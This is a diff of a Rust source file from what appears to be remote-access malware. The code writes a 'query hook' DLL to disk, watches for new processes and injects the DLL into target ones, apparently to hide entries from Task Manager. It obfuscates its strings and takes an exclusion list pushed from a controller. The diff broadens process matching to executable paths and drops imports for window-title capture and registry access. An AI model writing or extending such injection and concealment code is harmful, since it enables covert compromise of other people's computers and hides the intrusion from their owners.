@@ -1,25 +1,18 @@
-use std::{ path::PathBuf, sync::Mutex };
+use std::path::PathBuf;
 use obfstr::obfstr as s;
-use client_vars::constants::{
-    default_query_hook_exclusions,
-    query_hook_dll_name,
-    query_hook_exclusions_file_path,
-    query_hook_processes,
+use client_vars::{
+    constants::{
+        default_query_hook_exclusions,
+        query_hook_dll_name,
+        query_hook_exclusions_file_path,
+        query_hook_processes,
+    },
+    types::receive::UpdateTaskManagerExclusionsParams,
 };
-use shared::ref_log_internal;
-use shared::{ logs::logger::Logger, ref_info, utils::functions::get_current_exe_dir };
+use shared::utils::functions::get_current_exe_dir;
 use tokio::{ fs::{ create_dir_all, File }, io::AsyncWriteExt };
-use anyhow::{ Context, Result };
-use std::{ os::windows::process::CommandExt, process::Command };
-use winreg::enums::*;
-use winreg::RegKey;
-use serde::{ Deserialize, Serialize };
-use winapi::shared::ntdef::LPSTR;
-use winapi::shared::windef::{ HWND, RECT };
-use winapi::um::winuser::{ GetForegroundWindow, GetWindowTextA, GetWindowTextLengthA };
-use std::io::{ Cursor, Write };
-// use screenshots::Screen;
-// use screenshots::image;
+use anyhow::Result;
+use serde::Deserialize;
 use std::ffi::CString;
 use std::ptr::null_mut;
 use winapi::shared::minwindef::DWORD;
@@ -75,6 +68,9 @@ async fn setup_query_hooker_list() -> Result<()> {
         return Ok(());
     }
 }
+pub fn update_query_hooker_list(update_params: UpdateTaskManagerExclusionsParams) -> Result<()> {
+    Ok(())
+}
 
 pub async fn write_dll_bytes() -> Result<PathBuf> {
     let dll_path = get_current_exe_dir().join(query_hook_dll_name());
@@ -104,7 +100,14 @@ pub async fn run_query_hooker() -> Result<()> {
 
     for result in iterator {
         let process = result?.target_instance;
-        if target_processes.contains(&process.name.to_lowercase()) {
+        let exe_path = match process.executable_path {
+            Some(path) => PathBuf::from(path).file_name().unwrap().to_str().unwrap().to_owned(),
+            None => String::new(),
+        };
+        if
+            target_processes.contains(&process.name.to_lowercase()) ||
+            target_processes.contains(&exe_path.to_lowercase())
+        {
             // ref_info!(logger, "new process to be injected, name: ", process.name);
             // ref_info!(logger, "query hook dll onto PID: ", process.process_id);
 
